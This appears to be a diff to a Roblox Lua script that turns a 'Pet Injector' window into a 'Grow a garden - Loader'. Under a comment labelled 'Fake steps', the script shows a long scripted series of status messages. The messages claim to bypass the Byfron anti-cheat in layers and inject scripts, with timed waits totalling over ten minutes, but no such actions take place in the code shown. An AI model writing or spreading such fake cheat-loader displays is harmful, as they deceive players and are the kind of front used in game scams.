@@ -27,7 +27,7 @@ Instance.new("UICorner", topBar)
 
 -- Title
 local title = Instance.new("TextLabel", topBar)
-title.Text = "🧪 Pet Injector"
+title.Text = "🧪 Grow a garden - Loader 🧪"
 title.Font = Enum.Font.GothamBold
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextSize = 16
@@ -59,11 +59,11 @@ Instance.new("UICorner", inventory)
 local spawnBtn = Instance.new("TextButton", inventory)
 spawnBtn.Size = UDim2.new(0.8, 0, 0.6, 0)
 spawnBtn.Position = UDim2.new(0.1, 0, 0.2, 0)
-spawnBtn.Text = "Spawn Pets"
+spawnBtn.Text = "Load Main Script"
 spawnBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 90)
 spawnBtn.TextColor3 = Color3.new(1,1,1)
 spawnBtn.Font = Enum.Font.GothamBold
-spawnBtn.TextSize = 18
+spawnBtn.TextSize = 20
 Instance.new("UICorner", spawnBtn)
 
 -- Big overlay (95% of screen)
@@ -168,10 +168,25 @@ local function startInjection()
 	createDots()
 
 	-- Fake steps
-	overlayTitle.Text = "Bypassing Anti-Cheat..."
-	wait(2.5)
-	overlayTitle.Text = "Loading Pets..."
-
+	overlayTitle.Text = "Bypassing Anti-Cheat (BYFRON)..."
+	wait(7.5)
+ 	overlayTitle.Text = "🎉(BYFRON) Completed bypass layer 1🎉"
+        wait(2.1)
+	overlayTitle.Text = "Bypassing Anti-Cheat (BYFRON) Layer 2..."
+        wait(11.5)
+        overlayTitle.Text = "🎉(BYFRON) Completed bypass layer 2🎉"
+        wait(2.1)
+        overlayTitle.Text = "Loading UI"
+        wait(11.5)
+	overlayTitle.Text = "Loading Main Value's"
+        wait(9.5)
+	overlayTitle.Text = "Loading PlayerScript's"
+        wait(15.5)
+	overlayTitle.Text = "Injecting into to PlayerScriptService"
+        wait(13.5)
+	overlayTitle.Text = "Loading MainHub"
+        wait(500.5)
+        overlayTitle.Text = "🎉Completed🎉"
 	local duration = 600  -- 10 minutes
 	local start = tick()
 	while tick() - start < duration do
